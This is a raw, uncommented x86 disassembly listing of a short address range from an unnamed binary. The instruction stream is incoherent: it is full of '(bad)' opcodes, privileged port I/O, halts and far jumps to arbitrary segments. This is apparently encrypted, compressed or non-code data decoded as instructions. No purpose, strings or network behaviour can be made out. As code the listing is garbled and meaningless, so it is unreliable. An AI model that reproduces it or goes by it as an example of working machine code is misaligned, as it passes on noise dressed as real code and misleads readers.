  40caec:	and    al,0x69
  40caee:	aaa    
  40caef:	(bad)  
  40caf0:	jge    0x40cb67
  40caf2:	or     DWORD PTR [ecx-0x3e],ebx
  40caf5:	cmovae esp,edx
  40caf8:	ret    
  40caf9:	lods   eax,DWORD PTR ds:[esi]
  40cafa:	std    
  40cafb:	fnstcw WORD PTR [ecx]
  40cafd:	jle    0x40cb72
  40caff:	fs iret 
  40cb01:	xor    eax,0x499bacfb
  40cb06:	mov    esi,0x59247cd6
  40cb0b:	fld    DWORD PTR ds:0xe7f655c
  40cb11:	adc    BYTE PTR [ebp-0x2b6f26ef],0xd4
  40cb18:	not    esi
  40cb1a:	adc    al,0xd0
  40cb1c:	xchg   ebx,eax
  40cb1d:	jno    0x40cac3
  40cb1f:	retf   0xbdc2
  40cb22:	pop    edx
  40cb23:	cdq    
  40cb24:	mov    ds:0x39776593,al
  40cb29:	and    al,0xac
  40cb2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb2c:	mov    ss,edx
  40cb2e:	jg     0x40cab4
  40cb30:	push   edx
  40cb31:	xor    cl,bl
  40cb33:	cmp    edx,DWORD PTR [esi+0x23]
  40cb36:	ss adc eax,0x4ea3439c
  40cb3c:	ror    ch,1
  40cb3e:	mov    al,ds:0x1be35f04
  40cb43:	pop    eax
  40cb44:	lods   al,BYTE PTR ds:[esi]
  40cb45:	cmp    cl,BYTE PTR [edi-0xa]
  40cb48:	cwde   
  40cb49:	xor    eax,0x714c5b88
  40cb4e:	and    eax,0xa053d73b
  40cb53:	rcl    DWORD PTR [edi],0x93
  40cb56:	lock mov esi,0xe4fc1311
  40cb5c:	dec    esi
  40cb5d:	mov    al,ds:0xe119e022
  40cb62:	mov    fs,esp
  40cb64:	mov    ah,ch
  40cb66:	push   ds
  40cb67:	fwait
  40cb68:	jo     0x40cbd3
  40cb6a:	fwait
  40cb6b:	les    ecx,FWORD PTR [ecx]
  40cb6d:	adc    al,BYTE PTR [ebp+0x51]
  40cb70:	test   BYTE PTR [eax-0x62],bh
  40cb73:	fnsave [eax-0x56]
  40cb76:	enterw 0x8f16,0x7f
  40cb7b:	outs   dx,BYTE PTR ds:[esi]
  40cb7c:	inc    ebp
  40cb7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb7e:	lds    edi,FWORD PTR [edi]
  40cb80:	or     al,0x26
  40cb82:	mov    cl,al
  40cb84:	sbb    eax,0xe0b18175
  40cb89:	(bad)  
  40cb8b:	mov    ds:0x293bab78,al
  40cb90:	inc    esi
  40cb91:	and    al,0x41
  40cb93:	push   cs
  40cb94:	aad    0x37
  40cb96:	add    eax,0x4c5e462d
  40cb9b:	adc    DWORD PTR [eax+0x77],esp
  40cb9e:	xchg   edi,eax
  40cb9f:	jmp    0xec0e:0x42bf06f7
  40cba6:	cdq    
  40cba7:	mov    ecx,DWORD PTR [ebp+0x38e446a]
  40cbad:	cmp    eax,0x9d5fcd4e
  40cbb2:	leave  
  40cbb3:	inc    ebp
  40cbb4:	xor    esi,ebx
  40cbb6:	pop    ds
  40cbb7:	jbe    0x40cb3d
  40cbb9:	push   es
  40cbba:	xlat   BYTE PTR ds:[ebx]
  40cbbb:	cmp    ebp,edi
  40cbbd:	mov    edi,0x372e5ca1
  40cbc2:	popa   
  40cbc3:	jo     0x40cbfd
  40cbc5:	jns    0x40cc09
  40cbc7:	xchg   esp,eax
  40cbc8:	add    BYTE PTR ds:0x418fd894,ah
  40cbce:	pop    esp
  40cbcf:	and    eax,0xa23d6e84
  40cbd4:	sar    BYTE PTR ds:0xa3c02fd,cl
  40cbda:	or     BYTE PTR [ecx],dl
  40cbdc:	push   edx
  40cbdd:	dec    edx
  40cbde:	jle    0x40cb63
  40cbe0:	jmp    0x40cbc9
  40cbe2:	inc    esp
  40cbe3:	lahf   
  40cbe4:	into   
  40cbe5:	(bad)  
  40cbe6:	sti    
  40cbe7:	push   ds
  40cbe8:	xchg   ebp,eax
  40cbe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbea:	mov    eax,0xd9c03d12
  40cbef:	dec    ecx
  40cbf0:	mov    bh,BYTE PTR [edx]
  40cbf2:	add    edi,DWORD PTR [ecx]
  40cbf4:	ins    BYTE PTR es:[edi],dx
  40cbf5:	or     al,0x4b
  40cbf7:	in     eax,0x88
  40cbf9:	loopne 0x40cc43
  40cbfb:	or     ch,BYTE PTR [ecx]
  40cbfd:	inc    edx
  40cbfe:	mov    BYTE PTR [ecx-0x54999ba],0x11
  40cc05:	daa    
  40cc06:	push   0xffffff93
  40cc08:	cmc    
  40cc09:	and    BYTE PTR [edx-0x5],0x2
  40cc0d:	and    bh,BYTE PTR [esi-0x22]
  40cc10:	neg    edx
  40cc12:	xor    DWORD PTR [esi-0xa0da3f6],edi
  40cc18:	std    
  40cc19:	iret   
  40cc1a:	add    BYTE PTR [edi+0x3634fe28],dh
  40cc20:	add    edx,DWORD PTR [ecx+0x3d]
  40cc23:	retf   
  40cc24:	sbb    eax,0xb98c32b8
  40cc29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc2a:	pop    eax
  40cc2b:	jno    0x40cbca
  40cc2d:	xchg   esp,eax
  40cc2e:	shr    edx,1
  40cc30:	popa   
  40cc31:	or     al,0x29
  40cc33:	cld    
  40cc34:	cmp    eax,0x6b50fc93
  40cc39:	xchg   esp,eax
  40cc3a:	popa   
  40cc3b:	add    BYTE PTR [edx+0x2819eaec],0xd0
  40cc42:	leave  
  40cc43:	mov    eax,ds:0xe88bdc74
  40cc48:	push   ds
  40cc49:	mov    ebx,0x90d4b077
  40cc4e:	dec    esi
  40cc4f:	add    al,0x6c
  40cc51:	pop    esi
  40cc52:	cli    
  40cc53:	dec    edx
  40cc54:	push   0x73
  40cc56:	aas    
  40cc57:	adc    eax,0xdf4d00ad
  40cc5c:	jg     0x40cc24
  40cc5e:	or     bh,BYTE PTR [eax+0x22]
  40cc61:	mov    dh,0xde
  40cc63:	xchg   ch,dl
  40cc65:	test   BYTE PTR [esi],cl
  40cc67:	retf   0xa90a
  40cc6a:	call   0x4ee1b564
  40cc6f:	out    dx,eax
  40cc70:	pop    ebx
  40cc71:	inc    edx
  40cc72:	(bad)  
  40cc74:	sbb    eax,0x5c25856e
  40cc79:	ja     0x40cce0
  40cc7b:	out    0x68,al
  40cc7d:	inc    eax
  40cc7e:	ss in  eax,dx
  40cc80:	pop    ebx
  40cc81:	arpl   WORD PTR [edi+0x1d],si
  40cc84:	ds push eax
  40cc86:	and    al,0x1f
  40cc88:	dec    ebx
  40cc89:	in     al,dx
  40cc8a:	pop    ebx
  40cc8b:	lea    esi,ds:0xece8b74e
  40cc91:	pusha  
  40cc92:	push   edx
  40cc93:	sub    bl,ch
  40cc95:	out    0x5f,al
  40cc97:	scas   al,BYTE PTR es:[edi]
  40cc98:	or     DWORD PTR [ebp+ebx*4-0x12],esi
  40cc9c:	xlat   BYTE PTR ds:[ebx]
  40cc9d:	xor    ebp,DWORD PTR [ebp-0x1031fe9d]
  40cca3:	mov    ebp,0x15c42e4a
  40cca8:	sub    edx,DWORD PTR [edi]
  40ccaa:	outs   dx,BYTE PTR ds:[esi]
  40ccab:	mov    esp,0xf7bd584
  40ccb0:	or     BYTE PTR [edx+0x12],0x34
  40ccb4:	mov    ecx,DWORD PTR [ebx]
  40ccb6:	call   FWORD PTR [eax-0x2c]
  40ccb9:	mov    ?,WORD PTR [esp+ecx*8]
  40ccbc:	sub    ebp,DWORD PTR [ebp-0x754ee624]
  40ccc2:	fs lahf 
  40ccc4:	jae    0x40cc6e
  40ccc6:	sub    eax,0xd392406c
  40cccb:	push   ss
  40cccc:	aad    0x62
  40ccce:	mov    edx,0x2a0e1467
  40ccd3:	out    dx,al
  40ccd4:	pop    edi
  40ccd5:	out    dx,eax
  40ccd6:	xadd   BYTE PTR [ebp+0x58e44537],dl
  40ccdd:	fstp   DWORD PTR [eax+0x40429587]
  40cce3:	shl    BYTE PTR [ecx],1
  40cce5:	into   
  40cce6:	or     BYTE PTR [esi+0x4f],ah
  40cce9:	retf   0x8333
  40ccec:	lds    ebp,FWORD PTR [ebx]
  40ccee:	jne    0x40cd01
  40ccf0:	nop
  40ccf1:	mov    bh,dl
  40ccf3:	leave  
  40ccf4:	aas    
  40ccf5:	(bad)  
  40ccf6:	fcmovnu st,st(4)
  40ccf8:	jo     0x40cc83
  40ccfa:	popf   
  40ccfb:	scas   eax,DWORD PTR es:[edi]
  40ccfc:	jmp    0x7576:0x2569c145
  40cd03:	mov    ch,0x2b
  40cd05:	mov    al,0x41
  40cd07:	rcr    dh,1
  40cd09:	sbb    DWORD PTR [eax-0x22670fc4],esp
  40cd0f:	push   ss
  40cd10:	fwait
  40cd11:	sub    DWORD PTR [ebx-0x3a],eax
  40cd14:	(bad)  [esi+ebp*1]
  40cd17:	iret   
  40cd18:	xor    al,0x7d
  40cd1a:	iret   
  40cd1b:	sti    
  40cd1c:	sbb    BYTE PTR [esi+ebx*4-0x397ea21e],cl
  40cd23:	ja     0x40cd7d
  40cd25:	jp     0x40cd50
  40cd27:	push   0x55
  40cd29:	bound  ebp,QWORD PTR [edi-0x70]
  40cd2c:	sar    dl,0x70
  40cd2f:	stos   DWORD PTR es:[edi],eax
  40cd30:	mov    dh,0xc7
  40cd32:	ins    DWORD PTR es:[edi],dx
  40cd33:	jp     0x40cd67
  40cd35:	xor    ch,BYTE PTR [ebx]
  40cd37:	jmp    0x40ccc7
  40cd39:	inc    esp
  40cd3a:	pop    ebp
  40cd3b:	clc    
  40cd3c:	stos   DWORD PTR es:[edi],eax
  40cd3d:	jae    0x40cd6f
  40cd3f:	dec    esi
  40cd40:	inc    edx
  40cd41:	dec    edi
  40cd42:	pop    ss
  40cd43:	pop    ebx
  40cd44:	jmp    0x40cdbb
  40cd46:	imul   ecx,edi,0xd522d39a
  40cd4c:	push   ecx
  40cd4d:	les    esp,FWORD PTR [ecx]
  40cd4f:	fsub   QWORD PTR [edx]
  40cd51:	lds    esp,FWORD PTR [ebp-0x2058fc88]
  40cd57:	dec    esp
  40cd58:	jmp    0x55828f2a
  40cd5d:	clc    
  40cd5e:	nop
  40cd5f:	and    bl,cl
  40cd61:	das    
  40cd62:	mov    esi,0xc3eee835
  40cd67:	mov    al,ds:0xaa593e19
  40cd6c:	das    
  40cd6d:	cmp    eax,0x189fcff8
  40cd72:	jmp    0x8f90:0x78e5a292
  40cd79:	pop    ds
  40cd7a:	(bad)  
  40cd7c:	sub    al,0x35
  40cd7e:	sbb    eax,ebx
  40cd80:	shr    edi,0xd6
  40cd83:	test   dh,bl
  40cd85:	lahf   
  40cd86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd87:	aam    0xe9
  40cd89:	mov    eax,DWORD PTR [edi]
  40cd8b:	push   cs
  40cd8c:	repnz mov cl,0x61
  40cd8f:	pop    esi
  40cd90:	test   al,0xf9
  40cd92:	shl    DWORD PTR [eax],0x62
  40cd95:	xchg   al,ch
  40cd97:	sti    
  40cd98:	mov    ch,0x8f
  40cd9a:	cmp    eax,0x58bfae57
  40cd9f:	sbb    BYTE PTR [ebx-0x5dd1ae98],al
  40cda5:	mov    ecx,0x92a20982
  40cdaa:	repnz add eax,DWORD PTR [ecx+0x5b]
  40cdae:	pop    esp
  40cdaf:	dec    edx
  40cdb0:	push   ds
  40cdb1:	cmp    DWORD PTR [edi+0x4c],0x43
  40cdb5:	lds    esp,FWORD PTR [ebp-0x1f3a6437]
  40cdbb:	fldenv [edi]
  40cdbd:	dec    ecx
  40cdbe:	inc    esi
  40cdbf:	adc    eax,0x443138db
  40cdc4:	int3   
  40cdc5:	pop    edx
  40cdc6:	lods   eax,DWORD PTR ds:[esi]
  40cdc7:	mov    eax,0xe6497525
  40cdcc:	daa    
  40cdcd:	mov    ?,WORD PTR [ebp-0x51]
  40cdd0:	loope  0x40ce01
  40cdd2:	mov    WORD PTR [esi],fs
  40cdd4:	sub    al,0xa0
  40cdd6:	pop    esi
  40cdd7:	neg    DWORD PTR ds:0xcc942b96
  40cddd:	mov    ds:0xef94834a,al
  40cde2:	push   edx
  40cde3:	(bad)  
  40cde4:	cmp    cl,BYTE PTR es:[ecx-0x3497931b]
  40cdeb:	stos   DWORD PTR es:[edi],eax
  40cdec:	jecxz  0x40cd90
  40cdee:	not    bh
  40cdf0:	mov    bh,0xac
  40cdf2:	and    DWORD PTR [edi-0x2],edi
  40cdf5:	xor    BYTE PTR [ebx+0x7f],0x61
  40cdf9:	adc    eax,0x3157137
  40cdfe:	mov    edi,0xcf75adff
  40ce03:	dec    ebp
  40ce04:	and    eax,0x1fce668b
  40ce09:	push   cs
  40ce0a:	inc    ebp
  40ce0b:	pop    es
  40ce0c:	(bad)  
  40ce0d:	ficom  DWORD PTR [esi-0x64]
  40ce10:	lds    eax,FWORD PTR [edi]
  40ce12:	jae    0x40ce42
  40ce14:	sbb    eax,0xfb56ee93
  40ce19:	out    dx,eax
  40ce1a:	or     DWORD PTR [esi+0x6],esi
  40ce1d:	fnsave [eax-0x50]
  40ce20:	call   0x889a:0x9c442661
  40ce27:	test   al,0x2f
  40ce29:	mov    ebp,0xbb0b73b6
  40ce2e:	add    al,0xab
  40ce30:	inc    ecx
  40ce31:	or     ebp,DWORD PTR [eax-0x4c]
  40ce34:	mov    edx,0x9d48cf4c
  40ce39:	sar    BYTE PTR [ecx],cl
  40ce3b:	cmp    al,0x87
  40ce3d:	sahf   
  40ce3e:	push   edx
  40ce3f:	aaa    
  40ce40:	mov    esp,0xdd05d231
  40ce45:	dec    eax
  40ce46:	test   BYTE PTR [edi],al
  40ce48:	ret    
  40ce49:	leave  
  40ce4a:	sti    
  40ce4b:	sub    bh,BYTE PTR [ebx-0x6b]
  40ce4e:	popa   
  40ce4f:	sub    DWORD PTR [edx],ebp
  40ce51:	xor    DWORD PTR [edi],ebx
  40ce53:	push   ebp
  40ce54:	aaa    
  40ce55:	push   cs
  40ce56:	sbb    eax,DWORD PTR [eax-0x59]
  40ce59:	mov    ss:0xf2cdef20,eax
  40ce5f:	lods   al,BYTE PTR ds:[esi]
  40ce60:	add    BYTE PTR [ecx-0x7c],al
  40ce63:	iret   
  40ce64:	push   ss
  40ce65:	sbb    BYTE PTR [eax+0x44ffb044],al
  40ce6b:	mov    cl,0x3b
  40ce6d:	inc    ebx
  40ce6e:	jno    0x40ce2c
  40ce70:	mov    ecx,DWORD PTR [edi-0x52]
  40ce73:	ret    0xf06e
  40ce76:	out    dx,eax
  40ce77:	inc    edx
  40ce78:	inc    esp
  40ce79:	cmp    eax,0x2e706696
  40ce7e:	jmp    0x7be3470e
  40ce83:	(bad)  
  40ce84:	loopne 0x40ce42
  40ce86:	push   esi
  40ce88:	push   edi
  40ce89:	out    0x3a,eax
  40ce8b:	inc    edi
  40ce8c:	xchg   esi,eax
  40ce8d:	pop    esi
  40ce8e:	inc    DWORD PTR [ebx-0x18da0736]
  40ce94:	or     edx,edx
  40ce96:	mov    ebx,0xde50716f
  40ce9b:	mov    eax,DWORD PTR [esi+0x4859784b]
  40cea1:	jns    0x40cf09
  40cea3:	xchg   edi,ebp
  40cea5:	xchg   edx,eax
  40cea6:	popa   
  40cea7:	retf   
  40cea8:	sti    
  40cea9:	test   al,bh
  40ceab:	xchg   DWORD PTR [ecx+0x766d451],edi
  40ceb1:	leave  
  40ceb2:	ficomp WORD PTR [ecx-0x208deded]
  40ceb8:	ja     0x40ceb3
  40ceba:	sub    eax,0x45ef7f8
  40cebf:	inc    edx
  40cec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cec1:	adc    dl,dl
  40cec3:	add    BYTE PTR [esi+ebp*8-0x7cfa721c],dh
  40ceca:	rcl    cl,0xb8
  40cecd:	ins    BYTE PTR es:[edi],dx
  40cece:	nop
  40cecf:	jecxz  0x40ce90
  40ced1:	mov    esi,0xb79ea28e
  40ced6:	retf   
  40ced7:	cmp    al,0x61
  40ced9:	test   bh,dl
  40cedb:	arpl   WORD PTR [ebp-0x5f],ax
  40cede:	je     0x40cf4d
  40cee0:	mov    al,ds:0xb9784ef3
  40cee5:	sbb    eax,0x64941b6
  40ceea:	push   ds
  40ceeb:	call   0x5464c711
  40cef0:	in     al,dx
  40cef1:	mov    bh,0x98
  40cef3:	xchg   ebx,eax
  40cef4:	test   eax,0x200a9f6d
  40cef9:	pop    eax
  40cefa:	hlt    
  40cefb:	sbb    DWORD PTR [ecx+0x51],esi
  40cefe:	xor    eax,0x99811eb9
  40cf03:	ror    DWORD PTR [esi],cl
  40cf05:	inc    ebx
  40cf06:	pushf  
  40cf07:	xchg   BYTE PTR [ebx+0x7cf04fee],al
  40cf0d:	sbb    esp,0x4c
  40cf10:	pop    ebp
  40cf11:	ins    BYTE PTR es:[edi],dx
  40cf12:	out    0xb3,eax
  40cf14:	push   es
  40cf15:	ins    BYTE PTR es:[edi],dx
  40cf16:	in     eax,0x80
  40cf18:	ret    0xfe94
  40cf1b:	dec    eax
  40cf1c:	in     al,dx
  40cf1d:	pop    ebx
  40cf1e:	mov    eax,0xbcd90e08
  40cf23:	adc    BYTE PTR [esi],dl
  40cf25:	mov    cl,0x7e
  40cf27:	or     BYTE PTR [ebx],dl
  40cf29:	div    edx
  40cf2b:	and    bh,BYTE PTR [eax]
  40cf2d:	loope  0x40cf07
  40cf2f:	scas   eax,DWORD PTR es:[edi]
  40cf30:	mov    ecx,0x8ff41a73
  40cf35:	and    al,0xb2
  40cf37:	hlt    
  40cf38:	out    0xef,al
  40cf3a:	sub    BYTE PTR [ebx-0x3a1d96e8],dh
  40cf40:	outs   dx,BYTE PTR ds:[esi]
  40cf41:	int3   
  40cf42:	inc    ecx
  40cf43:	fiadd  WORD PTR [ecx]
  40cf45:	and    BYTE PTR [edi],ah
  40cf47:	fisttp QWORD PTR [esi-0x2705e1de]
  40cf4d:	cmp    al,0x1e
  40cf4f:	ret    
  40cf50:	mov    ch,0x8f
  40cf52:	dec    ebx
  40cf53:	jge    0x40cfd3
  40cf55:	mov    ebx,0x7024747a
  40cf5a:	repnz es mov ecx,0x5a14af1f
  40cf61:	call   0xd5f6:0x3a71520d
  40cf68:	arpl   WORD PTR [esi+0x5],bx
  40cf6b:	mov    ah,0x9f
  40cf6d:	retf   0x5eee
  40cf70:	xchg   edi,eax
  40cf71:	mov    ch,0x95
  40cf73:	lods   al,BYTE PTR gs:[esi]
  40cf75:	push   esp
  40cf76:	and    BYTE PTR [ebp+0x392fe92c],cl
  40cf7c:	ins    BYTE PTR es:[edi],dx
  40cf7d:	je     0x40cfd9
  40cf7f:	inc    ecx
  40cf80:	and    al,0xae
  40cf82:	pop    ebp
  40cf83:	jge    0x40cf2f
  40cf85:	popa   
  40cf86:	test   BYTE PTR ds:0x29562227,0x1e
  40cf8d:	or     ecx,DWORD PTR [edi-0x53]
  40cf90:	hlt    
  40cf91:	shl    DWORD PTR [ebx+eax*4-0xdac3c9d],cl
  40cf98:	fiadd  DWORD PTR [ebx]
  40cf9a:	mov    al,ds:0x8fcd5244
  40cf9f:	sub    BYTE PTR [ebx],ah
  40cfa1:	jae    0x40cfc2
  40cfa3:	and    ecx,ecx
  40cfa5:	mov    WORD PTR [ebx],ss
  40cfa7:	fisub  WORD PTR [edi]
  40cfa9:	outs   dx,BYTE PTR ds:[esi]
  40cfaa:	mov    al,0xfe
  40cfac:	mov    WORD PTR [edx],ss
  40cfae:	cmp    BYTE PTR [ebx-0x68],0x19
  40cfb2:	add    DWORD PTR ds:[edx+eax*4+0x2bb8c8a4],edi
  40cfba:	jmp    0x40d024
  40cfbc:	out    dx,al
  40cfbd:	jne    0x40d00a
  40cfbf:	xor    eax,0xd18a7237
  40cfc4:	jp     0x40cfc7
  40cfc6:	inc    edx
  40cfc7:	cld    
  40cfc8:	push   ss
  40cfc9:	cld    
  40cfca:	int    0xec
  40cfcc:	mov    bh,0x31
  40cfce:	iret   
  40cfcf:	scas   eax,DWORD PTR es:[edi]
  40cfd0:	mov    eax,DWORD PTR [edx+0x6d]
  40cfd3:	in     eax,0xa9
  40cfd5:	mov    al,0xc0
  40cfd7:	sub    dl,al
  40cfd9:	and    bl,BYTE PTR [edx+ebx*8+0x66]
  40cfdd:	(bad)  
  40cfde:	adc    ebx,ecx
  40cfe0:	cld    
  40cfe1:	add    DWORD PTR [edx*1+0xadb67ec],0xffffffb0
  40cfe9:	dec    ebx
  40cfea:	call   0x5440aed1
  40cfef:	xchg   ebp,eax
  40cff0:	cmp    bh,BYTE PTR ds:[ecx-0x5f]
  40cff4:	xchg   esp,eax
  40cff5:	push   ecx
  40cff6:	cmp    BYTE PTR [ebp+0x2326455c],al
  40cffc:	mov    esp,0xc93b698a
  40d001:	(bad)  
  40d002:	aam    0xbe
  40d004:	jae    0x40cff0
  40d006:	fs retf 
  40d008:	jnp    0x921da4fb
  40d00e:	imul   edx,DWORD PTR cs:[eax],0xffffffd1
  40d012:	adc    BYTE PTR [edi+0x2b],ah
  40d015:	mov    WORD PTR ds:0xf82a7997,?
  40d01b:	mov    ds:0x33ae4735,eax
  40d020:	pushf  
  40d021:	jecxz  0x40cfa5
  40d023:	pmovmskb ecx,mm0
  40d026:	mov    ds:0x7249afa6,al
  40d02b:	test   bl,al
  40d02d:	outs   dx,DWORD PTR ss:[esi]
  40d02f:	(bad)  
  40d030:	std    
  40d031:	xchg   edi,eax
  40d032:	loop   0x40d017
  40d034:	xor    DWORD PTR [ebx+0x3d8addce],ebp
  40d03a:	pop    ds
  40d03b:	adc    al,0x47
  40d03d:	fistp  WORD PTR [edx-0x25ddde71]
  40d043:	push   esp
  40d044:	test   BYTE PTR [edi],cl
  40d046:	clc    
  40d047:	in     eax,dx
  40d048:	iret   
  40d049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d04a:	add    DWORD PTR [edx*4-0x3fd0debb],ebx
  40d051:	scas   eax,DWORD PTR es:[edi]
  40d052:	int    0x4c
  40d054:	xchg   ebx,eax
  40d055:	fstp   DWORD PTR [eax]
  40d057:	cmp    al,0xd1
  40d059:	fcom   DWORD PTR [edi+0x4b0e180]
  40d05f:	test   BYTE PTR [edx],bl
  40d061:	repnz out 0x3d,eax
  40d064:	add    cl,0x30
  40d067:	push   esp
  40d068:	outs   dx,BYTE PTR ds:[esi]
  40d069:	push   0x19bc8814
  40d06e:	dec    esp
  40d06f:	nop
  40d070:	or     al,0xd9
  40d072:	sbb    bh,cl
  40d074:	repnz sub dh,BYTE PTR [eax+0x1d28c70a]
  40d07b:	xor    al,0x37
  40d07d:	(bad)  
  40d07e:	clc    
  40d07f:	sbb    al,0x5a
  40d081:	inc    esp
  40d082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d083:	shl    DWORD PTR [esi],1
  40d085:	cmp    BYTE PTR [ecx],al
  40d087:	sti    
  40d088:	lea    edi,[edx]
  40d08a:	stos   DWORD PTR es:[edi],eax
  40d08b:	jno    0x40d0d5
  40d08d:	mov    esi,0x12ef741b
  40d092:	sti    
  40d093:	daa    
  40d094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d095:	mov    BYTE PTR [edx-0x69],ah
  40d098:	inc    ebx
  40d099:	sbb    edi,esi
  40d09b:	mov    ch,0x4a
  40d09d:	mov    esi,0x351f986e
  40d0a2:	xchg   edx,eax
  40d0a3:	push   esi
  40d0a4:	lock pop ebx
  40d0a6:	aad    0x8b
  40d0a8:	pop    edx
  40d0a9:	cmp    BYTE PTR [ebx+eiz*8+0x72],cl
  40d0ad:	dec    ebx
  40d0ae:	push   esp
  40d0af:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40d0b1:	int    0x16
  40d0b3:	cmp    al,0x94
  40d0b5:	dec    esp
  40d0b6:	scas   al,BYTE PTR es:[edi]
  40d0b7:	fisttp QWORD PTR [edi+0x3483875]
  40d0bd:	and    esi,ebx
  40d0bf:	dec    ecx
  40d0c0:	jnp    0x40d120
  40d0c2:	fisubr DWORD PTR [ebp+ecx*1-0x58]
  40d0c6:	xlat   BYTE PTR ds:[ebx]
  40d0c7:	adc    edi,DWORD PTR [ecx]
  40d0c9:	imul   edi,eax,0x1035fa3f
  40d0cf:	fisub  DWORD PTR [eax-0x20]
  40d0d2:	test   al,0xda
  40d0d4:	test   DWORD PTR [ecx+0x607dfcd8],edx
  40d0da:	mov    al,0x6a
  40d0dc:	repnz lods al,BYTE PTR ds:[esi]
  40d0de:	ss stos DWORD PTR es:[edi],eax
  40d0e0:	and    BYTE PTR [edi],bh
  40d0e2:	loope  0x40d0bb
  40d0e4:	xor    ecx,esp
  40d0e6:	cmp    ecx,esi
  40d0e8:	and    eax,edi
  40d0ea:	cmc    
  40d0eb:	sti    
  40d0ec:	pop    esi
  40d0ed:	es jmp 0xcc9666fa
  40d0f3:	stos   DWORD PTR es:[edi],eax
  40d0f4:	(bad)  
  40d0f5:	(bad)  
  40d0f7:	dec    ecx
  40d0f8:	adc    al,0x10
  40d0fa:	in     eax,dx
  40d0fb:	out    dx,al
  40d0fc:	jbe    0x40d080
  40d0fe:	adc    al,0x96
  40d100:	nop
  40d101:	adc    al,0xa1
  40d103:	mov    al,0x43
  40d105:	(bad)  
  40d106:	loop   0x40d171
  40d108:	outs   dx,BYTE PTR ds:[esi]
  40d109:	cmp    eax,0x68ca07b3
  40d10e:	push   cs
  40d10f:	mov    ebp,0x53188f02
  40d114:	mov    ds:0x8d85ba6,al
  40d119:	sub    esp,DWORD PTR [edi-0x6d]
  40d11c:	dec    ebp
  40d11d:	out    0x8a,eax
  40d11f:	icebp  
  40d120:	cmp    al,0xc4
  40d122:	gs scas eax,DWORD PTR es:[edi]
  40d124:	jmp    0x40d0fa
  40d126:	dec    eax
  40d127:	xchg   dh,dl
  40d129:	aaa    
  40d12a:	in     al,dx
  40d12b:	mov    ds:0xa4df8164,eax
  40d130:	retf   
  40d131:	lods   al,BYTE PTR ds:[esi]
  40d132:	(bad)  
  40d133:	ret    0xe927
  40d136:	je     0x40d179
  40d138:	cdq    
  40d139:	std    
  40d13a:	adc    BYTE PTR [edx-0x57],0x17
  40d13e:	add    esi,DWORD PTR gs:[edx]
  40d141:	push   es
  40d142:	lahf   
  40d143:	or     DWORD PTR [esi],esi
  40d145:	jg     0x40d190
  40d147:	retf   
  40d148:	push   0xb12983cd
  40d14d:	ror    BYTE PTR [eax-0x30],0xdb
  40d151:	push   cs
  40d152:	repnz les ebx,FWORD PTR [esi-0x59]
  40d156:	push   ecx
  40d157:	pop    edi
  40d158:	jp     0x40d15e
  40d15a:	pusha  
  40d15b:	pop    ebx
  40d15c:	loopne 0x40d0fc
  40d15e:	push   cs
  40d15f:	mov    al,0x2c
  40d161:	mov    WORD PTR [edi+eiz*1],?
  40d164:	test   al,0x1b
  40d166:	jns    0x40d1c7
  40d168:	push   ss
  40d169:	fbstp  TBYTE PTR [edi-0x70]
  40d16c:	fstcw  WORD PTR [edi-0x53f5051e]
  40d173:	loopne 0x40d1a0
  40d175:	pushf  
  40d176:	add    eax,0xe67aa238
  40d17b:	icebp  
  40d17c:	add    al,0xc
  40d17e:	adc    ebx,DWORD PTR [ecx-0x75eadf0f]
  40d184:	div    DWORD PTR [eax-0x681b9ea4]
  40d18a:	jle    0x40d1af
  40d18c:	nop
  40d18d:	add    bl,0xcf
  40d190:	inc    ebx
  40d191:	gs push es
  40d193:	xor    DWORD PTR [ebp-0x17c97ee],edi
  40d199:	dec    ecx
  40d19a:	inc    esp
  40d19b:	outs   dx,DWORD PTR ds:[esi]
  40d19c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d19d:	stos   BYTE PTR es:[edi],al
  40d19e:	fwait
  40d19f:	xchg   esp,eax
  40d1a0:	stc    
  40d1a1:	or     ch,BYTE PTR [esi]
  40d1a3:	outs   dx,DWORD PTR ds:[esi]
  40d1a4:	shl    DWORD PTR [ecx],cl
  40d1a6:	mov    ebx,DWORD PTR [edi-0x38]
  40d1a9:	sbb    ebx,ebp
  40d1ab:	ficomp DWORD PTR [ebx-0x2b323df5]
  40d1b1:	jns    0x40d1f6
  40d1b3:	outs   dx,DWORD PTR ds:[esi]
  40d1b4:	cmp    DWORD PTR [edi+ecx*8],eax
  40d1b7:	rcr    BYTE PTR [edi],1
  40d1b9:	out    0x85,al
  40d1bb:	jns    0x40d1d0
  40d1bd:	pusha  
  40d1be:	aaa    
  40d1bf:	inc    edx
  40d1c0:	add    eax,0x8533404d
  40d1c5:	inc    esp
  40d1c6:	aam    0xfa
  40d1c8:	push   cs
  40d1c9:	retf   0xadb5
  40d1cc:	jnp    0x40d245
  40d1ce:	nop
  40d1cf:	dec    ebp
  40d1d0:	stos   BYTE PTR es:[edi],al
  40d1d1:	(bad)  
  40d1d2:	sahf   
  40d1d3:	adc    ebx,DWORD PTR fs:[ebx-0x1]
  40d1d7:	into   
  40d1d8:	call   0x94d205fd
  40d1dd:	xor    edi,DWORD PTR [edi]
  40d1df:	or     al,BYTE PTR [edi-0x32]
  40d1e2:	sbb    al,0x19
  40d1e4:	dec    eax
  40d1e5:	std    
  40d1e6:	nop
  40d1e7:	jb     0x40d172
  40d1e9:	add    edi,DWORD PTR [eax-0x2a]
  40d1ec:	adc    ebx,esp
  40d1ee:	loopne 0x40d237
  40d1f0:	(bad)  
  40d1f1:	repz shl ebx,0x90
  40d1f5:	inc    BYTE PTR [edi-0x1d]
  40d1f8:	sbb    eax,0xf896ab26
  40d1fd:	fidiv  WORD PTR [eax-0x11]
  40d200:	push   ecx
  40d201:	mov    bh,0xa7
  40d203:	mov    ch,0x80
  40d205:	nop
  40d206:	adc    BYTE PTR [edi-0x18d4b6ed],cl
  40d20c:	cmp    eax,0x689b2d3d
